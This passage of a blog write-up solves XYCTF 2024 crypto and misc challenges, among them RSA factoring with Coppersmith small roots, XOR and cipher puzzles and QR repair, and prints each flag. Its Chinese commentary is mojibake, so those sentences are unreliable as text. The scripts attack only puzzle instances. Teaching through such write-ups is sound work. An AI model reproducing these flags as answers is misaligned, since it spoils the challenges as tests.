class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>,<span class="number">50</span>):</span><br><span class="line">    low = <span class="built_in">int</span>(hashlib.sha256(<span class="built_in">str</span>(i).encode()).hexdigest(), <span class="number">16</span>)</span><br><span class="line">    m = low + x*<span class="number">2</span>**<span class="number">256</span></span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    roots = (m**<span class="number">3</span> - c).monic().small_roots(X=<span class="number">2</span>**(i*<span class="number">8</span>),beta=<span class="number">0.4</span>,epsilon=<span class="number">0.01</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        M = m(roots[<span class="number">0</span>])</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(M))[:i])</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="comment"># XYCTF&#123;!__d3ng__hu0__1@n__3h@n__Chu__!&#125;</span></span><br></pre></td></tr></table></figure><p>ä¸€å¼€å§‹æ€ä¹ˆéƒ½çˆ†ä¸å‡ºæ¥ï¼Œç»“æœå‘ç°æ˜¯epsilonå–å¤§äº†ï¼Œè¿˜æ²¡è§„å®šä¸Šä¸‹ç•Œï¼ˆè¿™ä¸ªX=X=2**(i*8)å°±æ˜¯ç¡®å®šä¸ºflagçš„é•¿åº¦çš„ï¼‰,è¿™æ ·å°±è¦å†™m = low + x*2**256ã€‚ä¸ç„¶ä¼šæ’ä¸Šä¸‹ç•Œ</p><h3 id="week2-2">week2</h3><h4 id="Sign1n-Revenge">Sign1n_Revenge</h4><p>å’Œsigninä¸€æ ·ï¼Œä¸å†™äº†</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">flag</span>&#123;<span class="number">09</span>c24f8d-dbf8-<span class="number">463</span>b-a16f-<span class="number">3</span>dbc47e4a726&#125;</span><br></pre></td></tr></table></figure><h4 id="happy-to-solve2">happy_to_solve2</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secrets <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_happy_prime</span>():</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        p = <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join([random.choice(<span class="string">&quot;123&quot;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>)]))</span><br><span class="line">        q = <span class="built_in">int</span>(<span class="string">&quot;&quot;</span>.join([random.choice(<span class="string">&quot;567&quot;</span>) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">512</span>)]))</span><br><span class="line">        <span class="keyword">if</span> isPrime(p) <span class="keyword">and</span> isPrime(q):</span><br><span class="line">            <span class="keyword">return</span> (p,q)</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">p ,q= get_happy_prime()</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line"><span class="built_in">print</span>(n)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">pow</span>(m, e, n))</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªpå’Œqæ¯ä¸€ä½æ—¢ç„¶åªæœ‰3ç§é€‰æ‹©ï¼Œé‚£å°±å¯ä»¥ä»æœ€ä½ä½å¼€å§‹çˆ†ç ´å‡ºpå’Œqçš„å€¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># # ä¹˜ç§¯n</span></span><br><span class="line">n = <span class="number">697906506747097082736076931509594586899561519277373830451275402914416296858960649459482027106166486723487162428522597262774248272216088755005277069446993003521270487750989061229071167729138628583207229945902389632065500739730301375338674342457656803764567184544685006193130563116558641331897204457729877920989968662546183628637193220770495938729301979912328865798266631957128761871326655572836258178871966196973138373358029531478246243442559418904559585334351259080578222274926069834941166567112522869638854253933559832822899069320370733424453856240903784235604251466010104012061821038897933884352804297256364409157501116832788696434711523621632436970698827611375698724661553712549209133526623456888111161142213830821361143023186927163314212097199831985368310770663850851571934739809387798422381702174820982531508641022827776262236373967579266271031713520262606203067411268482553539580686495739014567368858613520107678565628269250835478345171330669316220473129104495659093134763261751546990704365966783697780787341963138501</span></span><br><span class="line"></span><br><span class="line">p_values = [<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>]</span><br><span class="line">q_values = [<span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>]</span><br><span class="line"></span><br><span class="line">n_str = <span class="built_in">str</span>(n)</span><br><span class="line"></span><br><span class="line">p = <span class="string">&#x27;&#x27;</span></span><br><span class="line">q = <span class="string">&#x27;&#x27;</span></span><br><span class="line">upone = <span class="number">0</span></span><br><span class="line">flag = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set</span>(<span class="params">p, i, digit</span>):</span><br><span class="line">    p_list = <span class="built_in">list</span>(p)</span><br><span class="line">    <span class="keyword">if</span> i &lt; <span class="built_in">len</span>(p_list):</span><br><span class="line">        p_list[<span class="number">0</span>] = digit</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        p_list.insert(<span class="number">0</span>,digit)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(p_list)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_p_q</span>(<span class="params">i, p, q</span>):</span><br><span class="line">    <span class="keyword">if</span> (i &lt; <span class="number">0</span>)<span class="keyword">or</span>(<span class="built_in">int</span>(p)*<span class="built_in">int</span>(q)==n):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;p:&#x27;</span>, <span class="built_in">int</span>(p))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;q:&#x27;</span>, <span class="built_in">int</span>(q))</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    j = <span class="built_in">len</span>(n_str) -<span class="number">1</span> -i</span><br><span class="line">    <span class="keyword">for</span> p_val <span class="keyword">in</span> p_values:</span><br><span class="line">        new_p = <span class="built_in">set</span>(p, j, p_val)</span><br><span class="line">        <span class="keyword">for</span> q_val <span class="keyword">in</span> q_values:</span><br><span class="line">            new_q = <span class="built_in">set</span>(q, j, q_val)</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">str</span>(<span class="built_in">int</span>(new_q)*<span class="built_in">int</span>(new_p))[-(<span class="number">1</span>+j)]) == n_str[i]:</span><br><span class="line">                <span class="keyword">if</span> find_p_q(i-<span class="number">1</span>, new_p, new_q): <span class="comment"># å‘ä¸‹ä¸€å±‚</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span> <span class="comment"># å¦åˆ™å‘ä¸Šä¸€å±‚</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> find_p_q(<span class="built_in">len</span>(n_str)-<span class="number">1</span>, <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;0&#x27;</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;wrong&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="number">12121111312111223223122131311333233122132311113333112131132223222322113121112211311111122233111221112223111221331112322222333332331231122322123321123123133323213331321113332333332231113221231213322231322132311333132111221123111323112322131123322323331121233332123131222321123312221122323311122131121132332322222321213223131211322122311113331331222212121313131121212322112122212323321311231113213233312223111132133321123211122222213321223332322123131333322121223233122311222211311133331123122122331232313131221113</span></span><br><span class="line">q = <span class="number">57577765666565565655657656576766776756666756575575655557577765666657666756565556567577677665557556655765767767655556677756576555657667566766667676566655656776775755756775755667657675665677575667656666776656677656575665766556767757667556655755567556776556675656666757767667757657665757566667776555777667667675756767666767666557555757566576666656676677575575577567765566577557756566766557765676756756557667655756575677676567766776665777656776577676577576757576665777555555575575656555655657776566765775556575765677</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(p*q==n)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">e = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">n = <span class="number">697906506747097082736076931509594586899561519277373830451275402914416296858960649459482027106166486723487162428522597262774248272216088755005277069446993003521270487750989061229071167729138628583207229945902389632065500739730301375338674342457656803764567184544685006193130563116558641331897204457729877920989968662546183628637193220770495938729301979912328865798266631957128761871326655572836258178871966196973138373358029531478246243442559418904559585334351259080578222274926069834941166567112522869638854253933559832822899069320370733424453856240903784235604251466010104012061821038897933884352804297256364409157501116832788696434711523621632436970698827611375698724661553712549209133526623456888111161142213830821361143023186927163314212097199831985368310770663850851571934739809387798422381702174820982531508641022827776262236373967579266271031713520262606203067411268482553539580686495739014567368858613520107678565628269250835478345171330669316220473129104495659093134763261751546990704365966783697780787341963138501</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = <span class="number">12121111312111223223122131311333233122132311113333112131132223222322113121112211311111122233111221112223111221331112322222333332331231122322123321123123133323213331321113332333332231113221231213322231322132311333132111221123111323112322131123322323331121233332123131222321123312221122323311122131121132332322222321213223131211322122311113331331222212121313131121212322112122212323321311231113213233312223111132133321123211122222213321223332322123131333322121223233122311222211311133331123122122331232313131221113</span></span><br><span class="line">q = <span class="number">57577765666565565655657656576766776756666756575575655557577765666657666756565556567577677665557556655765767767655556677756576555657667566766667676566655656776775755756775755667657675665677575667656666776656677656575665766556767757667556655755567556776556675656666757767667757657665757566667776555777667667675756767666767666557555757566576666656676677575575577567765566577557756566766557765676756756557667655756575677676567766776665777656776577676577576757576665777555555575575656555655657776566765775556575765677</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">153383826085102296581238539677668696644156148059026868813759015106139131297135097831661048493079405226972222492151356105759235749502324303047037349410709021152255315429280760639113724345836532087970918453353723090554450581657930847674930226113840172368662838756446364482977092478979838209396761279326533419699056209983721842484996150025403009644653678928025861445324715419893797015875541525590135843027312322236085581571452084477262582966972702577136904385741443870527205640874446616413917231260133364227248928492574610248881137364204914001412269740461851747883355414968499272944590071623223603501698004227753335552646715567802825755799597955409228004284739743749531270833084850113574712041224896044525292591264637452797151098802604186311724597450780520140413704697374209653369969451501627583467893160412780732575085846467289134920886789952338174193202234175299652687560232593212131693456966318670843605238958724126368185289703563591477049105538528244632434869965333722691837462591128379816582723367039674028619947057144546</span></span><br><span class="line"></span><br><span class="line">Srsa(p,q,e,c)<span class="comment"># è‡ªå·±å†™çš„è§£å¯†å‡½æ•°</span></span><br><span class="line"><span class="comment"># b&#x27;XYCTF&#123;7f4b2241951976ce5ef6df44503209059997e5085d1bc21f6bef4d9effb29fd0&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="MISC">MISC</h2><h3 id="week1-3">week1</h3><h4 id="TCPL">TCPL</h4><p>æ‹–å…¥idaåˆ†æï¼Œï¼Œå‘ç°åªæ˜¯å¼‚æˆ–äº†iï¼Œå¾—åˆ°æ²¡æœ‰æ›¿æ¢çš„flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">b = [<span class="number">0x46</span>, <span class="number">0x4D</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0x7F</span>, <span class="number">0x55</span>, <span class="number">0x4A</span>, <span class="number">0x44</span>, <span class="number">0x5C</span>, <span class="number">0x56</span>, <span class="number">0x4B</span>, <span class="number">0x65</span>, <span class="number">0x38</span>, <span class="number">0x52</span>, <span class="number">0x7C</span>, <span class="number">0x3E</span>, <span class="number">0x43</span>, <span class="number">0x52</span>, <span class="number">0x64</span>, <span class="number">0x4C</span>, <span class="number">0x6C</span>, <span class="number">0x24</span>, <span class="number">0x7E</span>, <span class="number">0x62</span>, <span class="number">0x79</span>, <span class="number">0x77</span>, <span class="number">0x74</span>, <span class="number">0x2A</span>, <span class="number">0x61</span>]</span><br><span class="line">pxor(b)</span><br><span class="line"><span class="comment"># FLAG&#123;PLCT_An4_r1SCv_x1huann1&#125;</span></span><br></pre></td></tr></table></figure><p>æŠŠ1æ¢æˆå…¶å®ƒå€¼ï¼Œå¤šè¯•ä¸€ä¸‹</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FLAG&#123;PLCT_A<span class="symbol">n4</span>_r<span class="number">0</span>SCv_x<span class="number">0</span>hua<span class="symbol">nn0</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="ez-éšå†™">ez_éšå†™</h4><p>å¼€å¤´ä¸€ä¸ªä¼ªåŠ å¯†ï¼Œæ”¹å¥½äº†ä¹‹åæœ‰ä¸€ä¸ªhint.pngå’Œä¸€ä¸ªwatermark.jpgçš„æ–‡ä»¶,ä½†æ˜¯water.jpgè¦è§£å‹,ä¿®æ”¹hint.pngçš„é•¿å®½è·å¾—å¯†ç xyctf0401ï¼Œç„¶åè§£å‹watermark.jpgï¼Œç”¨ç›²æ°´å°å·¥å…·æ‰“å¼€å¯å¾—flag</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">XYCTF</span>&#123;<span class="number">758</span>-W5X-IJN-<span class="number">852</span>&#125;</span><br></pre></td></tr></table></figure><h4 id="ä¿®ä»™ä¼ ">ä¿®ä»™ä¼ </h4><h5 id="4å…ƒå©´">4å…ƒå©´</h5><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">éƒ½<span class="number">2024</span>å¹´äº†ä¸ä¼šè¿˜æœ‰äººè§£ä¸å‡ºU<span class="number">2</span>FsdGVkX<span class="number">1</span>+y<span class="number">2</span>rlJZlJCM<span class="symbol">nvyDwHwzkgHvNsG2</span>TF<span class="number">6</span>sFlBlxBs<span class="number">0</span>w<span class="number">4</span>EmyXdDe<span class="number">6</span>s<span class="number">7</span>viLå§</span><br></pre></td></tr></table></figure><p>key: 2024 TripleDesè§£å¯†å¾—å¯†ç </p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The<span class="number">_f</span>ourth<span class="number">_f</span>loor<span class="number">_</span><span class="keyword">is</span><span class="number">_</span>okay</span><br></pre></td></tr></table></figure><p>æ‰“å¼€æ–‡ä»¶å¾—åˆ°ä¸€ä¸ªå¾®ä¿¡æ•°æ®åº“æ–‡ä»¶å’Œä¸€ä¸ª</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wqkï¼š<span class="number">1</span><span class="name">m813</span>o<span class="symbol">nn17</span><span class="meta">o040358</span>p<span class="number">772</span>q<span class="number">37</span>r<span class="name">m137</span>qp<span class="symbol">nqppqpn38</span><span class="symbol">nr704</span><span class="name">m56</span><span class="symbol">n2</span><span class="name">m9</span>q<span class="number">22</span>p<span class="meta">o7</span>r<span class="number">05</span>r<span class="number">77</span></span><br></pre></td></tr></table></figure><p>ä¿®æ”¹å…¶ä¸­çš„å­—ç¬¦</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1A813CBB17C040358D772E37FA137EDBEDDEDB38BF704A56B2A9E22DC7F05F77</span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨è„šæœ¬è§£å¯†aeså³å¯</p><p><img src="https://s2.loli.net/2024/04/09/O4jcnmRQfHrpzWU.png" alt="image-20240409192304734"></p><h5 id="7åˆä½“">7åˆä½“</h5><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">å¯†æ–‡ï¼šTig+AF8-viakubq+AF8-vphrz+AF8-xi+AF8-uayzdyrjs</span><br><span class="line"></span><br><span class="line">å¬è¯´ç»´å‰å°¼äºš<span class="built_in">key</span>å¤§æ®‹</span><br></pre></td></tr></table></figure><p>æ”¾åˆ°ç»´å‰å°¼äºšè§£å¯†é‡Œé¢ï¼ŒAF8æŒ‡å¯†é’¥å’Œå¯†æ–‡é•¿åº¦ä¸€æ ·</p><p>å‡è®¾å¯†é’¥æ˜¯ABCDEFGHIJKLMNOPQRST</p><p>å¾—åˆ°å¯†ç </p><figure class="highlight ceylon"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">The<span class="number">_</span>seventh<span class="number">_</span>level<span class="number">_</span><span class="keyword">is</span><span class="number">_</span>difficult</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€å¼ é¢œè‰²å›¾ç‰‡ï¼Œ8è¿›åˆ¶è½¬æ¢å³å¯</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">they_were_thr0ugh!</span><br></pre></td></tr></table></figure><h5 id="8å¤§ä¹˜">8å¤§ä¹˜</h5><p>å¼€å¤´æ˜¯å¯†ç ï¼Œç›´æ¥ç”¨ç½‘ä¸Šçš„å¼‚æˆ–åŠ åˆè„šæœ¬çˆ†å‡ºæ¥pq</p><p>ç„¶årsaæ±‚å¯†ç </p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">pruning_algorithm</span></span><br></pre></td></tr></table></figure><p>å‡ºæ¥æ˜¯ä¸€ä¸ªyesnoæ–‡ä»¶</p><p>æ ¹æ®å‹ç¼©åŒ…çš„æç¤ºæŠŠyesæ”¹æˆ1ï¼Œnoæ”¹æˆ0ç”Ÿæˆå›¾ç‰‡</p><p>å†…å®¹æ˜¯åŸç¥çš„æ–‡å­—ï¼Œè½¬æ¢</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S<span class="name">m3</span>rt_y<span class="number">0</span>u_ca<span class="symbol">n_do</span></span><br></pre></td></tr></table></figure><h3 id="week3-2">week3</h3><h4 id="æˆ‘çš„äºŒç»´ç ä¸ºå•¥æ‰«ä¸å‡ºæ¥ï¼Ÿ">æˆ‘çš„äºŒç»´ç ä¸ºå•¥æ‰«ä¸å‡ºæ¥ï¼Ÿ</h4><p>æ ¹æ®å®šä½ç‚¹å’Œæ—¶åºå›¾æ¡ˆè¿˜åŸ</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">from PIL import Image</span><br><span class="line">import <span class="built_in">random</span></span><br><span class="line"></span><br><span class="line">def reverse_color(x):</span><br><span class="line">    <span class="built_in">return</span> <span class="number">0</span> <span class="keyword">if</span> x == <span class="number">255</span> <span class="keyword">else</span> <span class="number">255</span></span><br><span class="line"></span><br><span class="line">def reverse_row_colors(pixels, <span class="built_in">row</span>, <span class="built_in">width</span>, block_size=<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> x_block <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">width</span> // block_size):</span><br><span class="line">        x = x_block * block_size</span><br><span class="line">        y = <span class="built_in">row</span> * block_size</span><br><span class="line">        <span class="keyword">for</span> x_small <span class="keyword">in</span> <span class="built_in">range</span>(x, x + block_size):</span><br><span class="line">            <span class="keyword">for</span> y_small <span class="keyword">in</span> <span class="built_in">range</span>(y, y + block_size):</span><br><span class="line">                pixel = pixels[x_small, y_small]</span><br><span class="line">                pixels[x_small, y_small] = reverse_color(pixel)</span><br><span class="line"></span><br><span class="line">def reverse_col_colors(pixels, <span class="built_in">col</span>, <span class="built_in">height</span>, block_size=<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">for</span> y_block <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">height</span> // block_size):</span><br><span class="line">        x = <span class="built_in">col</span> * block_size</span><br><span class="line">        y = y_block * block_size</span><br><span class="line">        <span class="keyword">for</span> x_small <span class="keyword">in</span> <span class="built_in">range</span>(x, x + block_size):</span><br><span class="line">            <span class="keyword">for</span> y_small <span class="keyword">in</span> <span class="built_in">range</span>(y, y + block_size):</span><br><span class="line">                pixel = pixels[x_small, y_small]</span><br><span class="line">                pixels[x_small, y_small] = reverse_color(pixel)</span><br><span class="line"></span><br><span class="line">encrypted_img = Image.open(<span class="string">&quot;new.png&quot;</span>)</span><br><span class="line"></span><br><span class="line">decrypted_img = encrypted_img.<span class="built_in">copy</span>()</span><br><span class="line"></span><br><span class="line"><span class="built_in">width</span>, <span class="built_in">height</span> = decrypted_img.size</span><br><span class="line">pixels = decrypted_img.<span class="built_in">load</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reverse_row_colors(pixels, <span class="number">1</span>, <span class="built_in">width</span>)</span><br><span class="line">reverse_row_colors(pixels, <span class="number">12</span>, <span class="built_in">width</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">reverse_col_colors(pixels, <span class="number">2</span>, <span class="built_in">height</span>)</span><br><span class="line">reverse_col_colors(pixels, <span class="number">0</span>, <span class="built_in">height</span>)</span><br><span class="line">reverse_col_colors(pixels, <span class="number">5</span>, <span class="built_in">height</span>)</span><br><span class="line">reverse_col_colors(pixels, <span class="number">10</span>, <span class="built_in">height</span>)</span><br><span class="line">reverse_col_colors(pixels, <span class="number">11</span>, <span class="built_in">height</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">decrypted_img.<span class="built_in">save</span>(<span class="string">&quot;decrypted.png&quot;</span>)</span><br><span class="line"># flag&#123;qR_c0d3_1s_s0_fun&#125;</span><br></pre></td></tr></table></figure><h4 id="Rosk-Paper-Scissors">Rosk,Paper,Scissors!</h4><p>æ ¹æ®çœ‹aiçš„é€»è¾‘ï¼Œå‘ç°æ˜¯æ£€ç´¢æˆ‘å‡ºçš„æœ€å¤šçš„é‚£ä¸ªæ¥åˆ¤æ–­è¿™ä¸€æ¬¡å‡ºä»€ä¹ˆï¼Œé‚£å°±ååˆ¶è¿™ä¸ªï¼Œå†™è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">alist = [] </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_most_count</span>(<span class="params">alist</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = Counter(alist)</span><br><span class="line">        <span class="keyword">return</span> data.most_common(<span class="number">1</span>)[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = Counter(alist)</span><br><span class="line">            <span class="keyword">return</span> data.most_common(<span class="number">1</span>)[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;Scissors&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">back</span>(<span class="params"><span class="built_in">str</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span> ==<span class="string">&#x27;Rock&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Paper&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span> ==<span class="string">&#x27;Paper&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Scissors&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span> == <span class="string">&#x27;Scissors&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Rock&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Rock&#x27;</span></span><br><span class="line"><span class="comment"># åˆ›å»ºä¸€ä¸ªsocketå¯¹è±¡</span></span><br><span class="line">client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"><span class="comment"># è¿æ¥åˆ°æœåŠ¡å™¨</span></span><br><span class="line">client_socket.connect((<span class="string">&#x27;localhost&#x27;</span>, <span class="number">2137</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># åˆå§‹åŒ–ä¸Šä¸€æ¬¡çš„é€‰æ‹©ä¸ºNone</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># è¯»å–å¹¶æ‰“å°æœåŠ¡å™¨çš„æ¬¢è¿æ¶ˆæ¯</span></span><br><span class="line">data = client_socket.recv(<span class="number">1024</span>).decode()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;æ¥æ”¶åˆ°çš„æ•°æ®: <span class="subst">&#123;data&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="comment"># æ¸¸æˆå¾ªç¯</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    